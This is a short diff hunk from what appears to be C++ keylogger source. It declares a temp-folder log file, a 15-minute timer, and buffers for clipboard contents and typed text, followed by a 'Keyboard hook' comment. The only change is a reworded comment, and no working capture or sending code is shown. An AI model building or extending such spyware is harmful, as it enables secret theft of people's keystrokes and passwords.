@@ -87,7 +87,7 @@ const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // settin
 
 const std::chrono::seconds waitTime = std::chrono::seconds(int(15 * 60)); // seconds -> 15 minutes
 
-std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
+std::string clipBoardLastSave = ""; // saving the text saved in the windows' clipBoard
 std::string contentFile = ""; // save everything of what is been writing down
 
 // Keyboard hook
